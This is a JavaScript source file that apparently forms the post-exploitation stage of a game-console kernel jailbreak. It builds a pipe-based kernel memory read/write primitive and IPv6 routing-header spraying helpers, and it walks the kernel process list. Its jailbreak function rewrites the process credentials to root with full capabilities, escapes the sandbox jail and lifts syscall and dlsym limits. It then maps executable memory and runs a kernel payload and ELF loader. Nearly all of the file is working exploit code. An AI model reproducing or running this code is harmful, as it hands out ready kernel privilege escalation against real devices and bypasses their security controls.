//#region Constants
const KERNEL_PID = 0;

const PAGE_SIZE = 0x4000;

const SYSCORE_AUTHID = 0x4800000000000007n;

const FIOSETOWN = 0x8004667c;

const F_SETFL = 4;

const O_NONBLOCK = 4;

const AF_UNIX = 1;
const AF_INET = 2;
const AF_INET6 = 28;
const SOCK_STREAM = 1;
const SOCK_DGRAM = 2;
const SOL_SOCKET = 0xffff;
const SCM_RIGHTS = 1;
const SO_REUSEADDR = 4;
const SO_LINGER = 0x80;
const SO_SNDBUF = 0x1001;

const IPPROTO_TCP = 6;
const IPPROTO_UDP = 17;
const IPPROTO_IPV6 = 41;

const TCP_INFO = 32;
const TCPS_ESTABLISHED = 4;

const IPV6_2292PKTOPTIONS = 25;
const IPV6_PKTINFO = 46;
const IPV6_NEXTHOP = 48;
const IPV6_RTHDR = 51;
const IPV6_TCLASS = 61;

const UCRED_SIZE = 0x168;
const KQUEUE_SIZE = 0x100;
const TCP_INFO_SIZE = 0xec;
const FILEDESCENT_SIZE = 0x30;

const master_pipe = new Array(2);
const slave_pipe = new Array(2);

let spray_rthdr0_len = undefined;
let spray_rthdr0_addr = undefined;
let leak_rthdr0_addr = undefined;

let fdt_ofiles = undefined;
let allproc = undefined;

let kv = undefined;

fn.getpid = new NativeFunction(0x14, "number");
fn.setuid = new NativeFunction(0x17, "number");
fn.pipe2 = new NativeFunction(0x2af, "number");
fn.ioctl = new NativeFunction(0x36, "number");
fn.fcntl = new NativeFunction(0x5c, "number");
fn.socket = new NativeFunction(0x61, "number");
fn.setsockopt = new NativeFunction(0x69, "number");
fn.getsockopt = new NativeFunction(0x76, "number");
fn.mmap = new NativeFunction(0x1dd, "bigint");
fn.jitshm_create = new NativeFunction(0x215, "number");
//#endregion
//#region Classes
class KernelView extends DataView {
  constructor(master_pipe, slave_pipe) {
    super(new ArrayBuffer(8));

    if (!Array.isArray(master_pipe) || master_pipe.length !== 2) {
      throw new Error("pipe should have 2 fds for rw");
    }

    if (!Array.isArray(slave_pipe) || slave_pipe.length !== 2) {
      throw new Error("pipe should have 2 fds for rw");
    }

    this.master_pipe = master_pipe.slice();
    this.slave_pipe = slave_pipe.slice();

    if (fn.fcntl.invoke(this.master_pipe[0], F_SETFL, O_NONBLOCK) === -1) {
      throw new SyscallError(`Unable to fcntl fd ${this.master_pipe[0]}`);
    }

    if (fn.fcntl.invoke(this.master_pipe[1], F_SETFL, O_NONBLOCK) === -1) {
      throw new SyscallError(`Unable to fcntl fd ${this.master_pipe[1]}`);
    }

    if (fn.fcntl.invoke(this.slave_pipe[0], F_SETFL, O_NONBLOCK) === -1) {
      throw new SyscallError(`Unable to fcntl fd ${this.slave_pipe[0]}`);
    }

    if (fn.fcntl.invoke(this.slave_pipe[1], F_SETFL, O_NONBLOCK) === -1) {
      throw new SyscallError(`Unable to fcntl fd ${this.slave_pipe[1]}`);
    }

    this.pipe_buf = pipebuf.new();

    this.pipe_buf.in = 0;
    this.pipe_buf.out = 0;
    this.pipe_buf.size = PAGE_SIZE;
  }

  free() {
    mem.free(this.pipe_buf.addr);
  }

  get dv_backing() {
    return this.buffer.getBackingStore();
  }

  get pipe_backing() {
    return this.pipe_buf.buffer;
  }

  set pipe_backing(addr) {
    if (addr === 0n) {
      throw new Error("Empty addr !!");
    }

    this.pipe_buf.buffer = addr;
  }

  get pipe_count() {
    return this.pipe_buf.cnt;
  }

  set pipe_count(count) {
    if (count < 0 && count > 0xffffffff) {
      throw new RangeError(`count ${count} out of range !!`);
    }

    this.pipe_buf.cnt = count;
  }

  flush() {
    if (fn.write.invoke(this.master_pipe[1], this.pipe_buf.addr, pipebuf.sizeof) === -1n) {
      throw new SyscallError(`Unable to write to fd ${this.master_pipe[1]} !!`);
    }

    if (fn.read.invoke(this.master_pipe[0], this.pipe_buf.addr, pipebuf.sizeof) === -1n) {
      throw new SyscallError(`Unable to read from fd ${this.master_pipe[0]} !!`);
    }
  }

  kread(dst, src, sz) {
    this.pipe_backing = src;
    this.pipe_count = sz;
    this.flush();

    const n = fn.read.invoke(this.slave_pipe[0], dst, sz);
    if (n === -1n) {
      throw new SyscallError(`Unable to read from fd ${this.slave_pipe[0]} !!`);
    }

    return n;
  }

  kwrite(dst, src, sz) {
    this.pipe_backing = dst;
    this.pipe_count = sz;
    this.flush();

    const n = fn.write.invoke(this.slave_pipe[1], src, sz);
    if (n === -1n) {
      throw new SyscallError(`Unable to write to fd ${this.slave_pipe[1]} !!`);
    }

    return n;
  }

  getFloat32(byteOffset, littleEndian = false) {
    super.setBigUint64(0, 0n, true);

    this.kread(this.dv_backing, this.pipe_backing + byteOffset.bigint(), 4);

    return super.getFloat32(0, littleEndian);
  }

  getFloat64(byteOffset, littleEndian = false) {
    this.kread(this.dv_backing, this.pipe_backing + byteOffset.bigint(), 8);

    return super.getFloat64(0, littleEndian);
  }

  getInt8(byteOffset) {
    super.setBigUint64(0, 0n, true);

    this.kread(this.dv_backing, this.pipe_backing + byteOffset.bigint(), 1);

    return super.getInt8(0);
  }

  getInt16(byteOffset, littleEndian = false) {
    super.setBigUint64(0, 0n, true);

    this.kread(this.dv_backing, this.pipe_backing + byteOffset.bigint(), 2);

    return super.getInt16(0, littleEndian);
  }

  getInt32(byteOffset, littleEndian = false) {
    super.setBigUint64(0, 0n, true);

    this.kread(this.dv_backing, this.pipe_backing + byteOffset.bigint(), 4);

    return super.getInt32(0, littleEndian);
  }

  getUint8(byteOffset) {
    super.setBigUint64(0, 0n, true);

    this.kread(this.dv_backing, this.pipe_backing + byteOffset.bigint(), 1);

    return super.getUint8(0);
  }

  getUint16(byteOffset, littleEndian = false) {
    super.setBigUint64(0, 0n, true);

    this.kread(this.dv_backing, this.pipe_backing + byteOffset.bigint(), 2);

    return super.getUint16(0, littleEndian);
  }

  getUint32(byteOffset, littleEndian = false) {
    super.setBigUint64(0, 0n, true);

    this.kread(this.dv_backing, this.pipe_backing + byteOffset.bigint(), 4);

    return super.getUint32(0, littleEndian);
  }

  getBigInt64(byteOffset, littleEndian = false) {
    this.kread(this.dv_backing, this.pipe_backing + byteOffset.bigint(), 8);

    return super.getBigInt64(0, littleEndian);
  }

  getBigUint64(byteOffset, littleEndian = false) {
    this.kread(this.dv_backing, this.pipe_backing + byteOffset.bigint(), 8);

    return super.getBigUint64(0, littleEndian);
  }

  setFloat32(byteOffset, value, littleEndian = false) {
    super.setBigUint64(0, 0n, true);

    super.setFloat32(0, value, littleEndian);

    this.kwrite(this.pipe_backing + byteOffset.bigint(), this.dv_backing, 4);
  }

  setFloat64(byteOffset, value, littleEndian = false) {
    this.kwrite(this.pipe_backing + byteOffset.bigint(), this.dv_backing, 8);
  }

  setInt8(byteOffset, value) {
    super.setBigUint64(0, 0n, true);

    super.setInt8(0, value);

    this.kwrite(this.pipe_backing + byteOffset.bigint(), this.dv_backing, 1);
  }

  setInt16(byteOffset, value, littleEndian = false) {
    super.setBigUint64(0, 0n, true);
    super.setInt16(0, value, littleEndian);

    this.kwrite(this.pipe_backing + byteOffset.bigint(), this.dv_backing, 2);
  }

  setInt32(byteOffset, value, littleEndian = false) {
    super.setBigUint64(0, 0n, true);
    super.setInt32(0, value, littleEndian);

    this.kwrite(this.pipe_backing + byteOffset.bigint(), this.dv_backing, 4);
  }

  setUint8(byteOffset, value) {
    super.setBigUint64(0, 0n, true);
    super.setUint8(0, value);

    this.kwrite(this.pipe_backing + byteOffset.bigint(), this.dv_backing, 1);
  }

  setUint16(byteOffset, value, littleEndian = false) {
    super.setBigUint64(0, 0n, true);
    super.setUint16(0, value, littleEndian);

    this.kwrite(this.pipe_backing + byteOffset.bigint(), this.dv_backing, 2);
  }

  setUint32(byteOffset, value, littleEndian = false) {
    super.setBigUint64(0, 0n, true);
    super.setUint32(0, value, littleEndian);

    this.kwrite(this.pipe_backing + byteOffset.bigint(), this.dv_backing, 4);
  }

  setBigInt64(byteOffset, value, littleEndian = false) {
    super.setBigInt64(0, value, littleEndian);

    this.kwrite(this.pipe_backing + byteOffset.bigint(), this.dv_backing, 8);
  }

  setBigUint64(byteOffset, value, littleEndian = false) {
    super.setBigUint64(0, value, littleEndian);

    this.kwrite(this.pipe_backing + byteOffset.bigint(), this.dv_backing, 8);
  }
}
//#endregion
//#region Functions
function build_rthdr(addr, sz) {
  const rthdr0 = ip6_rthdr0.new(addr);

  const in6_count = Math.floor((sz - ip6_rthdr0.sizeof) / in6_addr.sizeof);

  rthdr0.ip6r0_nxt = 0;
  rthdr0.ip6r0_len = in6_count * 2;
  rthdr0.ip6r0_type = 0;
  rthdr0.ip6r0_segleft = in6_count;

  return ip6_rthdr0.sizeof + in6_addr.sizeof * in6_count;
}

function get_rthdr(sock, sz) {
  const leak_rthdr0_len_addr = mem.alloc(4);
  arw.view(leak_rthdr0_len_addr).setInt32(0, sz, true);
  if (fn.getsockopt.invoke(sock, IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr0_addr, leak_rthdr0_len_addr) === -1) {
    throw new SyscallError(`Unable to get socket option for fd ${sock} !!`);
  }

  const leak_rthdr0_len = arw.view(leak_rthdr0_len_addr).getInt32(0, true);

  mem.free(leak_rthdr0_len_addr);

  return leak_rthdr0_len;
}

function set_rthdr(sock) {
  if (fn.setsockopt.invoke(sock, IPPROTO_IPV6, IPV6_RTHDR, spray_rthdr0_addr, spray_rthdr0_len) === -1) {
    throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);
  }
}

function free_rthdr(sock) {
  if (fn.setsockopt.invoke(sock, IPPROTO_IPV6, IPV6_RTHDR, 0, 0) === -1) {
    throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);
  }
}

function make_socket(domain, type, protocol = 0) {
  const sock = fn.socket.invoke(domain, type, protocol);
  if (sock === -1) {
    throw new SyscallError("Unable to create socket !!");
  }

  return sock;
}

function make_karw_pipe() {
  const pair_addr = mem.alloc(8);

  // Create karw pipe
  if (fn.pipe2.invoke(pair_addr) === -1) {
    throw new SyscallError("Unable to create pipe !!");
  }

  master_pipe[0] = arw.view(pair_addr).getInt32(0, true);
  master_pipe[1] = arw.view(pair_addr).getInt32(4, true);

  if (fn.pipe2.invoke(pair_addr) === -1) {
    throw new SyscallError("Unable to create pipe !!");
  }

  slave_pipe[0] = arw.view(pair_addr).getInt32(0, true);
  slave_pipe[1] = arw.view(pair_addr).getInt32(4, true);

  logger?.debug(`master_pipe: ${master_pipe}`);
  logger?.debug(`slave_pipe: ${slave_pipe}`);

  mem.free(pair_addr);
}

function free_karw_pipe() {
  if (typeof kv === "undefined") {
    for (const fd of master_pipe) {
      if (fd === 0) {
        continue;
      }

      if (fn.close.invoke(fd) === -1) {
        throw new SyscallError(`Unable to close fd ${fd} !!`);
      }
    }

    for (const fd of slave_pipe) {
      if (fd === 0) {
        continue;
      }

      if (fn.close.invoke(fd) === -1) {
        throw new SyscallError(`Unable to close fd ${fd} !!`);
      }
    }
  }
}

/**
 * @param {bigint} addr
 * @return {DataView<ArrayBuffer>}
 */
function kview(addr) {
  if (kv.pipe_backing !== addr) {
    kv.pipe_backing = addr;
  }

  return kv;
}

function fget(fd) {
  return kview(fdt_ofiles).getBigUint64(fd * FILEDESCENT_SIZE, true);
}

function fput(fd, fp) {
  return kview(fdt_ofiles).getBigUint64(fd * FILEDESCENT_SIZE, fp, true);
}

function fhold(fp) {
  const f_count = kview(fp).getInt32(0x28, true);
  kview(fp).setInt32(0x28, f_count + 1, true);
}

function get_in6p_outputopts(fd) {
  const fp = fget(fd);
  const f_data = kview(fp).getBigUint64(0, true);
  const so_pcb = kview(f_data).getBigUint64(0x18, true);
  return kview(so_pcb).getBigUint64(0x120, true); // in6p_outputopts
}

function get_pktinfo_from_so(fd) {
  return kview(get_in6p_outputopts(fd)).getBigUint64(0x10, true); // ip6po_pktinfo
}

function get_rthdr_from_so(fd) {
  return kview(get_in6p_outputopts(fd)).getBigUint64(0x70, true); // ip6po_rthdr
}

function inc_f_count(fd) {
  fhold(fget(fd));
}

function inc_karw_pipe_refcnt() {
  inc_f_count(master_pipe[0]);
  inc_f_count(master_pipe[1]);
  inc_f_count(slave_pipe[0]);
  inc_f_count(slave_pipe[1]);
}

function remove_pktinfo_from_so(fd) {
  kview(get_in6p_outputopts(fd)).setBigUint64(0x10, 0n, true); // ip6po_pktinfo
}

function remove_rthdr_from_so(fd) {
  kview(get_in6p_outputopts(fd)).setBigUint64(0x70, 0n, true); // ip6po_rthdr
}

function pfind(pid) {
  let p = kview(allproc).getBigUint64(0, true);
  while (p !== 0n) {
    const p_pid = kview(p).getInt32(0xbc, true);
    if (p_pid === pid) break;

    p = kview(p).getBigUint64(0, true); // p_list.le_next
  }

  return p;
}

function find_all_proc() {
  logger?.info("Finding allproc...");

  const tmp_pipe = new Array(2);

  const pair_addr = mem.alloc(8);

  if (fn.pipe2.invoke(pair_addr) === -1) {
    throw new SyscallError("Unable to create pipe !!");
  }

  tmp_pipe[0] = arw.view(pair_addr).getInt32(0, true);
  tmp_pipe[1] = arw.view(pair_addr).getInt32(4, true);

  mem.free(pair_addr);

  try {
    const pid_addr = mem.alloc(4);
    arw.view(pid_addr).setInt32(0, pid, true);

    if (fn.ioctl.invoke(tmp_pipe[0], FIOSETOWN, pid_addr) === -1) {
      throw new SyscallError(`Unable to ioctl fd ${tmp_pipe[0]} !!`);
    }

    mem.free(pid_addr);

    const fp = fget(tmp_pipe[0]);
    const f_data = kview(fp).getBigUint64(0, true);
    const pipe_sigio = kview(f_data).getBigUint64(0xd8, true);
    let p = kview(pipe_sigio).getBigUint64(0, true);

    const mask = 0xffffffff00000000n;
    while ((p & mask) !== mask) {
      p = kview(p).getBigUint64(8, true); // p_list.le_prev
    }

    allproc = p;
    logger?.info(`allproc: ${allproc.hex()}`);
  } finally {
    for (let i = 0; i < tmp_pipe.length; i++) {
      if (tmp_pipe[i] === 0) {
        continue;
      }

      if (fn.close.invoke(tmp_pipe[i]) === -1) {
        throw new SyscallError(`Unable to close fd ${tmp_pipe[i]} !!`);
      }
    }
  }
}

function jailbreak() {
  logger?.info("Initiate jailbreak...");

  const p = pfind(pid);
  const kp = pfind(KERNEL_PID);

  // Patch credentials and capabilities
  const p_ucred = kview(p).getBigUint64(0x40, true);
  const kp_ucred = kview(kp).getBigUint64(0x40, true);

  const prison0 = kview(kp_ucred).getBigUint64(0x30, true);

  kview(p_ucred).setInt32(0x04, 0, true); // cr_uid
  kview(p_ucred).setInt32(0x08, 0, true); // cr_ruid
  kview(p_ucred).setInt32(0x0c, 0, true); // cr_svuid
  kview(p_ucred).setInt32(0x10, 1, true); // cr_ngroups
  kview(p_ucred).setInt32(0x14, 0, true); // cr_rgid
  kview(p_ucred).setInt32(0x18, 0, true); // cr_svgid
  kview(p_ucred).setBigUint64(0x30, prison0, true); // cr_prison
  kview(p_ucred).setBigUint64(0x58, SYSCORE_AUTHID, true); // cr_sceAuthId
  kview(p_ucred).setBigInt64(0x60, -1n, true); // cr_sceCaps[1]
  kview(p_ucred).setBigInt64(0x68, -1n, true); // cr_sceCaps[0]
  kview(p_ucred).setUint8(0x83, 0x80); // cr_sceAttr[0]

  // Allow root file system access
  const p_fd = kview(p).getBigUint64(0x48, true);
  const kp_fd = kview(kp).getBigUint64(0x48, true);

  const root_vnode = kview(kp_fd).getBigUint64(0x08, true);

  kview(p_fd).setBigUint64(0x08, root_vnode, true); // fd_cdir
  kview(p_fd).setBigUint64(0x10, root_vnode, true); // fd_rdir
  kview(p_fd).setBigUint64(0x18, 0n, true); // fd_jdir

  // Allow syscall from everywhere.
  const p_dynlib = kview(p).getBigUint64(0x3e8, true);

  kview(p_dynlib).setBigInt64(0xf0, 0n, true); // start
  kview(p_dynlib).setBigInt64(0xf8, -1n, true); // end

  // Allow dlsym.
  const dynlib_eboot = kview(p_dynlib).getBigUint64(0, true);
  const eboot_segments = kview(dynlib_eboot).getBigUint64(0x40, true);

  kview(eboot_segments).setBigInt64(0x08, 0n, true); // addr
  kview(eboot_segments).setBigInt64(0x10, -1n, true); // size

  logger?.info("Achieved jailbreak !!");
}

function load_bin() {
  const kexp_addr = kexp.buffer.getBackingStore();
  const kexp_size = kexp.length.alignUp(PAGE_SIZE);

  const exec_fd = fn.jitshm_create.invoke(0, kexp_size, 7);

  logger?.debug(`exec_fd: ${exec_fd}`);

  const entry_addr = fn.mmap.invoke(0, kexp_size, 7, 0, exec_fd, 0);
  if (entry_addr === -1n) {
    throw new SyscallError(`Unable to map memory with size ${kexp_size.hex(false)}`);
  }

  logger?.debug(`entry_addr: ${entry_addr.hex()}`);

  mem.copy(entry_addr, kexp_addr, kexp.length);

  const pthread_addr_addr = mem.alloc(8);

  const payload_args = mem.alloc(0x28);

  const elfldr_addr = elfldr.buffer.getBackingStore();
  const elfldr_size = elfldr.length.bigint();

  arw.view(payload_args).setInt32(0, master_pipe[0], true);
  arw.view(payload_args).setInt32(4, master_pipe[1], true);
  arw.view(payload_args).setInt32(8, slave_pipe[0], true);
  arw.view(payload_args).setInt32(0xc, slave_pipe[1], true);
  arw.view(payload_args).setBigUint64(0x10, allproc, true);
  arw.view(payload_args).setBigUint64(0x18, elfldr_addr, true);
  arw.view(payload_args).setBigUint64(0x20, elfldr_size, true);

  if (fn.pthread_create.invoke(pthread_addr_addr, 0, entry_addr, payload_args)) {
    throw new Error(`Unable to create bin thread !!`);
  }

  const pthread_addr = arw.view(pthread_addr_addr).getBigUint64(0, true);
  const pthread_id = arw.view(pthread_addr).getBigUint64(0, true);

  logger?.info(`Created bin thread with id ${pthread_id} !!`);

  mem.free(pthread_addr_addr);

  const ret_addr = mem.alloc(8);

  if (fn.pthread_join.invoke(pthread_addr, ret_addr)) {
    throw new Error(`Unable to join thread ${this.name} !!`);
  }

  const ret = arw.view(ret_addr).getBigUint64(0, true);

  logger?.info(`bin returned ${ret.hex()} !!`);

  mem.free(ret_addr);
}
//#endregion
//#region Structs
const in6_addr = new Struct("in6_addr", [{ type: "Uint8", name: "s6_addr", count: 16 }]);

const ip6_rthdr0 = new Struct("ip6_rthdr0", [
  { type: "Uint8", name: "ip6r0_nxt" },
  { type: "Uint8", name: "ip6r0_len" },
  { type: "Uint8", name: "ip6r0_type" },
  { type: "Uint8", name: "ip6r0_segleft" },
  { type: "Uint32", name: "ip6r0_reserved" },
]);

const pipebuf = new Struct("pipebuf", [
  { type: "Uint32", name: "cnt" },
  { type: "Uint32", name: "in" },
  { type: "Uint32", name: "out" },
  { type: "Uint32", name: "size" },
  { type: "Uint64", name: "buffer" },
]);
//#endregion
